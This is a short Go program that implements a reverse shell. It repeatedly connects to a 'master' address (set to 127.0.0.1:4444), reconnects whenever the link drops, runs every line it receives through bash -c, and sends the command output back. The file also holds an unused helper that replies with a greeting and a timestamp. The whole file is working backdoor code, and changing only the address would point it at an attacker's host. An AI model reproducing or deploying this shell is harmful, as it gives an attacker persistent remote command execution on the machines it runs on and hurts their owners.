package main

import (
	"bufio"
	"log"
	"net"
	"os/exec"
	"time"
)

func main() {
	var master_ip string
	master_ip = "127.0.0.1:4444"
	reverseshell(master_ip)
}

func reverseshell(addr string) {
chk_conn:
	// make sure the master is online
	for {
		c, e := net.Dial("tcp", addr)
		if e != nil {
			time.Sleep(3 * time.Second)
		} else {
			c.Close()
			break
		}
	}

	// now send out our shell
	conn, _ := net.Dial("tcp", addr)
	for {
		status, disconn := bufio.NewReader(conn).ReadString('\n')
		if disconn != nil {
			goto chk_conn
			break
		}
		cmd := exec.Command("bash", "-c", status)
		out, _ := cmd.Output()
		conn.Write([]byte(out))
	}
}

func handleIncomingConnection(conn net.Conn) {
	// store incoming data
	buffer := make([]byte, 1024)
	_, err := conn.Read(buffer)
	if err != nil {
		log.Fatal(err)
	}
	// respond
	time := time.Now().Format("Monday, 02-Jan-06 15:04:05 MST")
	conn.Write([]byte("Hi back!\n"))
	conn.Write([]byte(time))

	// close conn
	conn.Close()
}
